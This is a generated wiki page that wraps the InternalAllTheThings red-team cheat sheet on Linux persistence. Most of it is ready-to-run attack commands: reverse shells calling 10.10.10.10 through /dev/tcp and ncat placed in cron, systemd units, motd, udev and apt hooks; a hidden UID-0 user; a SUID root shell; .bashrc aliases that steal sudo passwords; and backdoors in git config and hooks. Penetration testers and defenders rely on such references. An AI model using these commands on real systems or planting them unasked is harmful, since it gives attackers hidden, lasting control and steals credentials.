---
parsed_by: focuslocust
source: internalallthethings
type: generated
---
# Linux - Persistence

[Home](../../../README.md)

## Provenance

| Field | Value |
| --- | --- |
| Source | `internalallthethings` |
| Type | `internal-topic` |
| Record ID | `iatt-redteam-persistence-linux-persistence` |
| Source file | `/home/adams/scorchederf/focuslocust/.cache/internalallthethings/docs/redteam/persistence/linux-persistence.md` |
| Parsed by | `focuslocust` |
| Relationship mode | `explicit / conservative inferred / manual` |

## Generated Concept Page

- [Linux - Persistence](../../topics/redteam/linux-persistence.md)

## Extracted Fields

| Field | Value |
| --- | --- |
| id | iatt-redteam-persistence-linux-persistence |
| name | Linux - Persistence |
| type | internal-topic |
| source | internalallthethings |
| url | https://github.com/swisskyrepo/InternalAllTheThings/blob/main/docs/redteam/persistence/linux-persistence.md |

## Preserved Source Material

````yaml
_body: "# Linux - Persistence\n\n## Summary\n\n* [Basic Reverse Shell](#basic-reverse-shell)\n* [Add a Root User](#add-a-root-user)\n\
  * [SUID Binary](#suid-binary)\n* [Crontab](#crontab)\n* [Bash Configuration File](#bash-configuration-file)\n* [Startup\
  \ Service](#startup-service)\n* [Systemd User Service](#systemd-user-service)\n* [Systemd Timer File](#systemd-timer-file)\n\
  * [Message of the Day](#message-of-the-day)\n* [User Startup File](#user-startup-file)\n* [Udev Rule](#udev-rule)\n* [APT\
  \ Configuration](#apt-configuration)\n* [SSH Configuration](#ssh-configuration)\n* [Git Configuration](#git-configuration)\n\
  \    * [Git Configuration Variables](#git-configuration-variables)\n    * [Git Hooks](#git-hooks)\n* [Additional Linux Persistence\
  \ Options](#additional-persistence-options)\n* [References](#references)\n\n## Basic Reverse Shell\n\n```bash\nncat --udp\
  \ -lvp 4242\nncat --sctp -lvp 4242\nncat --tcp -lvp 4242\n```\n\n## Add a Root User\n\n```powershell\nsudo useradd -ou 0\
  \ -g 0 john\nsudo passwd john\necho \"linuxpassword\" | passwd --stdin john\n```\n\n## SUID Binary\n\n```powershell\nTMPDIR2=\"\
  /var/tmp\"\necho 'int main(void){setresuid(0, 0, 0);system(\"/bin/sh\");}' > $TMPDIR2/croissant.c\ngcc $TMPDIR2/croissant.c\
  \ -o $TMPDIR2/croissant 2>/dev/null\nrm $TMPDIR2/croissant.c\nchown root:root $TMPDIR2/croissant\nchmod 4777 $TMPDIR2/croissant\n\
  ```\n\n## Crontab\n\nCrontab (short for cron table) is a configuration file for scheduling tasks (cron jobs) in Unix-like\
  \ systems. It allows users to automate repetitive commands at specific times or intervals.\n\nA crontab entry follows this\
  \ format:\n\n```ps1\n* * * * * command-to-execute\n| | | | |\n| | | | └── Day of the week (0-7, Sunday = 0 or 7)\n| | |\
  \ └──── Month (1-12)\n| | └────── Day of the month (1-31)\n| └──────── Hour (0-23)\n└────────── Minute (0-59)\n```\n\nRun\
  \ a script every time the system reboots.\n\n```bash\n(crontab -l ; echo \"@reboot sleep 200 && ncat 10.10.10.10 4242 -e\
  \ /bin/bash\")|crontab 2> /dev/null\n```\n\n## Bash Configuration File\n\nThe ~/.bashrc file is a user-specific configuration\
  \ script for Bash (Bourne Again Shell). It runs automatically whenever a new interactive, non-login shell is opened (e.g.,\
  \ when opening a terminal).\n\nExample of a backdoor in `.bash_rc` where a reverse shell is triggered when the user is using\
  \ the `sudo` command:\n\n```bash\nTMPNAME2=\".systemd-private-b21245afee3b3274d4b2e2-systemd-timesyncd.service-IgCBE0\"\n\
  cat << EOF > /tmp/$TMPNAME2\n  alias sudo='locale=$(locale | grep LANG | cut -d= -f2 | cut -d_ -f1);if [ \\$locale  = \"\
  en\" ]; then echo -n \"[sudo] password for \\$USER: \";fi;if [ \\$locale  = \"fr\" ]; then echo -n \"[sudo] Mot de passe\
  \ de \\$USER: \";fi;read -s pwd;echo; unalias sudo; echo \"\\$pwd\" | /usr/bin/sudo -S nohup nc -lvp 1234 -e /bin/bash >\
  \ /dev/null && /usr/bin/sudo -S '\nEOF\nif [ -f ~/.bashrc ]; then\n    cat /tmp/$TMPNAME2 >> ~/.bashrc\nfi\nif [ -f ~/.zshrc\
  \ ]; then\n    cat /tmp/$TMPNAME2 >> ~/.zshrc\nfi\nrm /tmp/$TMPNAME2\n```\n\nAdd the following line inside the user's `.bashrc`\
  \ file to hijack the sudo command and write the content of the input into `/tmp/pass`.\n\n```powershell\nchmod u+x ~/.hidden/fakesudo\n\
  echo \"alias sudo=~/.hidden/fakesudo\" >> ~/.bashrc\n```\n\nFinally, create the `fakesudo` script.\n\n```powershell\nread\
  \ -sp \"[sudo] password for $USER: \" sudopass\necho \"\"\nsleep 2\necho \"Sorry, try again.\"\necho $sudopass >> /tmp/pass.txt\n\
  \n/usr/bin/sudo $@\n```\n\n## Startup Service\n\nEdit `/etc/network/if-up.d/upstart` file\n\n```bash\nRSHELL=\"ncat $LMTHD\
  \ $LHOST $LPORT -e \\\"/bin/bash -c id;/bin/bash\\\" 2>/dev/null\"\nsed -i -e \"4i \\$RSHELL\" /etc/network/if-up.d/upstart\n\
  ```\n\n## Systemd User Service\n\nCreate a service file in `~/.config/systemd/user/`.\n\n```ps1\nvim ~/.config/systemd/user/persistence.service\n\
  ```\n\nAdd the following configuration:\n\n```ps1\n[Unit]\nDescription=Reverse shell[Service]\nExecStart=/usr/bin/bash -c\
  \ 'bash -i >& /dev/tcp/10.10.10.10/4444 0>&1'\nRestart=always\nRestartSec=60[Install]\nWantedBy=default.target\n```\n\n\
  Enable service and start service:\n\n```ps1\nsystemctl --user enable persistence.service\nsystemctl --user start persistence.service\n\
  ```\n\n## Systemd Timer File\n\nA Systemd Timer is a way to schedule tasks (like cron jobs) using Systemd instead of `cron`.\
  \ It works alongside a corresponding service file to execute commands at specific intervals or times.\n\nCreate a timer\
  \ file : `/etc/systemd/system/backdoor.timer`\n\n```ini\n[Unit]\nDescription=Backdoor Timer\n\n[Timer]\nOnBootSec=5min\n\
  OnUnitActiveSec=1h\n\n[Install]\nWantedBy=timers.target\n```\n\nCreate a Corresponding Service Unit File: `/etc/systemd/system/backdoor.service`\n\
  \n```ini\n[Unit]\nDescription=Backdoor Service\n\n[Service]\nType=simple\nExecStart=/bin/bash /opt/backdoor/backdoor.sh\n\
  ```\n\nEnable and Start the Timer\n\n```ps1\nsudo systemctl enable shout.timer\nsudo systemctl start shout.timer\n```\n\n\
  ## Message of the Day\n\nEdit `/etc/update-motd.d/00-header` file\n\n```bash\necho 'bash -c \"bash -i >& /dev/tcp/10.10.10.10/4444\
  \ 0>&1\"' >> /etc/update-motd.d/00-header\n```\n\n## User Startup File\n\nThe `~/.config/autostart/` directory is used in\
  \ Linux desktop environments (like GNOME, KDE, XFCE) to automatically start applications when a user logs in.\n\nEach startup\
  \ program is defined using a .desktop file placed in this directory.\n\n```powershell\n[Desktop Entry]\nType=Application\n\
  Name=Custom Script\nExec=/home/user/scripts/startup.sh\nHidden=false\nNoDisplay=false\nX-GNOME-Autostart-enabled=true\n\
  ```\n\n## Udev Rule\n\nUdev is the device manager for the Linux kernel, responsible for dynamically handling device events.\
  \ It can be exploited for persistence by executing a script whenever a specific device is plugged in.\n\n```bash\necho \"\
  ACTION==\\\"add\\\",ENV{DEVTYPE}==\\\"usb_device\\\",SUBSYSTEM==\\\"usb\\\",RUN+=\\\"$RSHELL\\\"\" | tee /etc/udev/rules.d/71-vbox-kernel-drivers.rules\
  \ > /dev/null\n```\n\nAfter saving the rule file, reload the udev rules:\n\n```ps1\nsudo udevadm control --reload-rules\n\
  sudo udevadm trigger\n```\n\n## APT Configuration\n\nIf you can create a file on the `apt.conf.d` directory with:\n\n```ps1\n\
  APT::Update::Pre-Invoke {\"CMD\"};\n```\n\nNext time \"`apt-get update`\" is done, your CMD will be executed!\n\n```bash\n\
  echo 'APT::Update::Pre-Invoke {\"nohup ncat -lvp 1234 -e /bin/bash 2> /dev/null &\"};' > /etc/apt/apt.conf.d/42backdoor\n\
  ```\n\n## SSH Configuration\n\nAdd an SSH key into the `~/.ssh` folder.\n\n`~/.ssh/authorized_keys` is the standard file\
  \ used by SSH to store public keys that are allowed to log in to the user account. Historically `authorized_keys` handled\
  \ SSH protocol version 1 keys and `authorized_keys2` handled SSH protocol version 2 keys.\n\n1. Generate a new key with\
  \ `ssh-keygen`\n2. Write the content of `~/.ssh/id_rsa.pub` into `~/.ssh/authorized_keys` or `~/.ssh/authorized_keys2`\n\
  3. Set the right permission\n\n| Path/File                 | Recommended Permission | Description                      \
  \                |\n|---------------------------|------------------------|--------------------------------------------------|\n\
  | `~/.ssh/`                 | `700`                  | Only the user can read/write/execute the folder  |\n| `~/.ssh/authorized_keys`\
  \  | `600`                  | Only the user can read/write the file            |\n| `~/.ssh/authorized_keys2` | `600`  \
  \                | Same as above; legacy/deprecated file            |\n\n## Git Configuration\n\nBackdooring git can be\
  \ a useful way to obtain persistence without the need for root access.  \nSpecial care must be taken to ensure that the\
  \ backdoor commands create no output, otherwise the persistence is trivial to notice.\n\n### Git Configuration Variables\n\
  \nThere are multiple [git configuration variables](https://git-scm.com/docs/git-config) that execute arbitrary commands\
  \ when certain actions are taken.  \nAs an added bonus, git configs can be specified multiple ways leading to additional\
  \ backdoor opportunities.  \nConfigs can be set at the user level (`~/.gitconfig`), at the repository level (`path/to/repo/.git/config`),\
  \ and sometimes via environment variables.\n\n`core.editor` is executed whenever git needs to provide the user with an editor\
  \ (e.g. `git rebase -i`, `git commit --amend`).  \nThe equivalent environment variable is `GIT_EDITOR`.\n\n```properties\n\
  [core]\neditor = nohup BACKDOOR >/dev/null 2>&1 & ${VISUAL:-${EDITOR:-emacs}}\n```\n\n`core.pager` is executed whenever\
  \ git needs to potentially large amounts of data (e.g. `git diff`, `git log`, `git show`).  \nThe equivalent environment\
  \ variable is `GIT_PAGER`.\n\n```properties\n[core]\npager = nohup BACKDOOR >/dev/null 2>&1 & ${PAGER:-less}\n```\n\n`core.sshCommand`\
  \ is executed whenever git needs to interact with a remote *ssh* repository (e.g. `git fetch`, `git pull`, `git push`).\
  \  \nThe equivalent environment variable is `GIT_SSH` or `GIT_SSH_COMMAND`.\n\n```properties\n[core]\nsshCommand = nohup\
  \ BACKDOOR >/dev/null 2>&1 & ssh\n[ssh]\nvariant = ssh\n```\n\nNote that `ssh.variant` (`GIT_SSH_VARIANT`) is technically\
  \ optional, but without it git will run `sshCommand` *twice* in rapid succession.  (The first run is to determine the SSH\
  \ variant and the second to pass it the correct parameters.)\n\n### Git Hooks\n\n[Git hooks](https://git-scm.com/docs/githooks)\
  \ are programs you can place in a hooks directory to trigger actions at certain points during git's execution.\n\nBy default,\
  \ hooks are stored in a repository's `.git/hooks` directory and are run when their name matches the current git action and\
  \ the hook is marked as executable (i.e. `chmod +x`).  \nPotentially useful hook scripts to backdoor:\n\n* `pre-commit`\
  \ is run just before `git commit` is executed.\n* `pre-push` is run just before `git push` is executed.\n* `post-checkout`\
  \ is run just after `git checkout` is executed.\n* `post-merge` is run after `git merge` or after `git pull` applies new\
  \ changes.\n\nIn addition to spawning a backdoor, some of the above hooks can be used to sneak malicious changes into a\
  \ repo without the user noticing.\n\nLastly, it is possible to globally backdoor *all* of a user's git hooks by setting\
  \ the `core.hooksPath` git config variable to a common directory in the user-level git config file (`~/.gitconfig`).  Note\
  \ that this approach will break any existing repository-specific git hooks.\n\n## Additional Persistence Options\n\n* [SSH\
  \ Authorized Keys](https://attack.mitre.org/techniques/T1098/004)\n* [Compromise Client Software Binary](https://attack.mitre.org/techniques/T1554)\n\
  * [Create Account](https://attack.mitre.org/techniques/T1136/)\n* [Create Account: Local Account](https://attack.mitre.org/techniques/T1136/001/)\n\
  * [Create or Modify System Process](https://attack.mitre.org/techniques/T1543/)\n* [Create or Modify System Process: Systemd\
  \ Service](https://attack.mitre.org/techniques/T1543/002/)\n* [Event Triggered Execution: Trap](https://attack.mitre.org/techniques/T1546/005/)\n\
  * [Event Triggered Execution](https://attack.mitre.org/techniques/T1546/)\n* [Event Triggered Execution: .bash_profile and\
  \ .bashrc](https://attack.mitre.org/techniques/T1546/004/)\n* [External Remote Services](https://attack.mitre.org/techniques/T1133/)\n\
  * [Hijack Execution Flow](https://attack.mitre.org/techniques/T1574/)\n* [Hijack Execution Flow: LD_PRELOAD](https://attack.mitre.org/techniques/T1574/006/)\n\
  * [Pre-OS Boot](https://attack.mitre.org/techniques/T1542/)\n* [Pre-OS Boot: Bootkit](https://attack.mitre.org/techniques/T1542/003/)\n\
  * [Scheduled Task/Job](https://attack.mitre.org/techniques/T1053/)\n* [Scheduled Task/Job: At (Linux)](https://attack.mitre.org/techniques/T1053/001/)\n\
  * [Scheduled Task/Job: Cron](https://attack.mitre.org/techniques/T1053/003/)\n* [Server Software Component](https://attack.mitre.org/techniques/T1505/)\n\
  * [Server Software Component: SQL Stored Procedures](https://attack.mitre.org/techniques/T1505/001/)\n* [Server Software\
  \ Component: Transport Agent](https://attack.mitre.org/techniques/T1505/002/)\n* [Server Software Component: Web Shell](https://attack.mitre.org/techniques/T1505/003/)\n\
  * [Traffic Signaling](https://attack.mitre.org/techniques/T1205/)\n* [Traffic Signaling: Port Knocking](https://attack.mitre.org/techniques/T1205/001/)\n\
  * [Valid Accounts: Default Accounts](https://attack.mitre.org/techniques/T1078/001/)\n* [Valid Accounts: Domain Accounts\
  \ 2](https://attack.mitre.org/techniques/T1078/002/)\n\n## References\n\n* [apt.conf.d backdoor- RandoriSec - September\
  \ 3, 2018](https://twitter.com/RandoriSec/status/1036622487990284289)\n* [g0t r00t? pwning a machine - muelli - June 25,\
  \ 2009](https://blogs.gnome.org/muelli/2009/06/g0t-r00t-pwning-a-machine/)\n* [Modern Linux Rootkits 101 - Tyler Borland\
  \ (TurboBorland) - September 20, 2013](http://turbochaos.blogspot.com/2013/09/linux-rootkits-101-1-of-3.html)\n* [[Hacking-Contest]\
  \ Rootkit - Jakob Lell - May 7, 2014](http://www.jakoblell.com/blog/2014/05/07/hacking-contest-rootkit/)"
_relative_path: redteam/persistence/linux-persistence.md
_source_path: /home/adams/scorchederf/focuslocust/.cache/internalallthethings/docs/redteam/persistence/linux-persistence.md
````
